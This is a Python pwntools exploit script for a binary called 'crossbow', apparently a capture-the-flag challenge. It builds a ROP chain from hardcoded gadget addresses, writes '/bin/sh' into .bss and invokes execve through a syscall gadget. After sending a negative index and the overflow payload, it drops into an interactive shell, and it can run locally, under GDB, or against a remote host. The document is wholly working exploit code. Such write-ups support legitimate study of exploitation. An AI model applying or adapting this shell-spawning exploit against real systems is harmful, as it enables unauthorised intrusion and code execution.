#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./crossbow', checksec=False)
libc = exe.libc

def init(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        docker_port = sys.argv[1]
        docker_path = sys.argv[2]
        p = remote("localhost", docker_port)
        sleep(1)
        pid = process(["pgrep", "-fx", docker_path]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

b *0x000000000040125E
b *training+126
b *target_dummy+430
c
'''.format(**locals())

p = init()

# ==================== EXPLOIT ====================

def exploit():


    pop_rax = 0x401001 # pop rax ; ret
    pop_rdi = 0x0401d6c # pop rdi ; ret
    pop_rsi = 0x40566b # pop rsi ; ret
    pop_rdx = 0x401139 # pop rdx ; ret
    syscall = 0x404b51 # syscall; ret;
    www = 0x4020f5 # mov qword ptr [rdi], rax ; ret

    sh = b"/bin/sh\x00"
    bss = 0x40e220

    payload = flat(
        [
            pop_rax,
            sh,
            pop_rdi,
            bss,
            www,
            pop_rdi,
            bss,
            pop_rsi,
            0,
            pop_rdx,
            0,
            pop_rax,
            0x3b,
            syscall
        ]
    )

    payload = b"A"*8 + payload

    p.sendlineafter(b":", b"-2")
    p.sendlineafter(b">", payload)

    p.interactive()

if __name__ == '__main__':
    exploit()
